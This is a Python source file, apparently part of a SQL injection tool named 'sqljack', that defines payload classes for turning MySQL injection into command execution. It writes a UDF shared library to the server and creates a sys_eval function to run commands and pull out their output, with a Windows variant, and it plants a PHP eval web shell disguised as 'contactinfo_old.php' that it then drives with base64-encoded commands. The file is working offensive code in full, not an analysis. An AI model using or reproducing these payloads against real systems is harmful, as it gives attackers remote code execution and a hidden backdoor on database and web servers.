# -*- coding: utf-8 -*-
###
# STD modules
###
import os, sys, logging, re, base64

###
# sqljack
###
import libsqljack

class payload_exec_via_lib_linux(libsqljack.payload_generic):

    def __init__(self, url):
        self.lib = "mysql_udf/lib_mysqludf_sys.so"
        self.prefix = "/usr/lib/"
        super(payload_exec_via_lib_linux, self).__init__(url)

    def build_payload(self, cmd, *args):
        self._chunksize = 16
        self._datapos = 1
        self._datasize = 0
        self.lines = []
        self._mode = "init"
        self.log.info("Writing dynamic library (%s) ..." % self.lib)
        data = libsqljack.str2hex(open(self.lib).read())
        self.randlib = "randsql.so" #"%s.so" % libsqljack.mkrandstr(8)
        yield {'mysql_inject' : "(SELECT CAST(%s AS BINARY) INTO DUMPFILE '%s%s')" % (
            data, self.prefix, self.randlib
        )}
        self._mode = "create"
        self.log.info("Creating new function ...")
        yield {'mysql_exec' : "CREATE FUNCTION sys_eval RETURNS STRING SONAME \"%s\"" % (
            self.randlib
        )}
        self._mode = "count"
        self.log.info("Fetching command output length...")
        yield {'mysql_inject' : "(SELECT length(CAST(sys_eval(%s) as BINARY)))" % libsqljack.str2hex(cmd)}
        if self._datasize:
            self._mode = "dump"
            self.log.info("Fetching command output ...")
            while self._datapos < self._datasize:
                yield {'mysql_inject' : "(SELECT substr(CAST(sys_eval(%s) as BINARY), %d, %d))" % (
                    libsqljack.str2hex(cmd), self._datapos, self._chunksize
                )}
                self._datapos += self._chunksize
                sys.stdout.write(".")
                sys.stdout.flush()

    def parse_result(self, result):
        try:
            if self._mode == 'count':
                self._datasize = int(result)
                print "Dumping %d bytes" % bytes
        except Exception, e:
            pass
        if self._mode == 'dump':
            self.lines.append(result)

    def get_output(self):
        sys.stdout.write("\n")
        return "".join(self.lines)

class payload_exec_via_lib_windows(payload_exec_via_lib_linux):

    def __init__(self, url):
        self.lib = "mysql_udf/lib_mysqludf_sys.dll"
        self.prefix = "C:\\WINDOWS\\SYSTEM32\\"
        super(payload_exec_via_lib_linux, self).__init__(url)

class payload_exec_via_file(libsqljack.payload_generic):

    def build_payload(self, cmd, *args):
        self.filename = "contactinfo_old.php"
        self.pathok = False
        if not len(args):
            self.log.error("No output path specified. Aborting ...")
            yield False
        self.pathok = True
        self.cmd = cmd
        backdoor = libsqljack.str2hex('<?php eval($_REQUEST[cmd]); ?>');
        yield {'mysql_inject' : "(SELECT %s INTO DUMPFILE '%s%s')" % (
            backdoor, args[0], self.filename
        )}

    def get_output(self):#, cmd, *args):
        if not self.pathok:
            return False
        basedir = os.path.split(self.url)[0]
        POSTDATA = {'cmd' : "passthru(base64_decode('%s'));" % base64.b64encode(self.cmd)}
        out = libsqljack.send_web_request("%s/%s" % (basedir, self.filename), POSTDATA)
        return out

class payload_default(payload_exec_via_lib_linux):
    pass
